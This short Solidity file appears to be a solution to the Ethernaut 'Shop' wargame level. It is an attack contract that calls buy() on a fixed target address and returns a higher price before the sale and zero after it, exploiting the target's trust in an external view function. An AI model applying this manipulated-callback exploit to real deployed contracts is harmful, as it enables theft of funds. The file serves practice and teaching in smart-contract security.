// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ShopEthernaut {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Shop {
    ShopEthernaut public en;

    constructor() payable {
        en = ShopEthernaut(address(0xeB966FeD2B43349182bA9b1Cd2ABF30C8CED734f));
    }

    function tryit() public {
        en.buy();
    }

    function price() external view returns (uint256) {
        if (en.isSold()) {
            return 0;
        }
        return 101;
    }
}
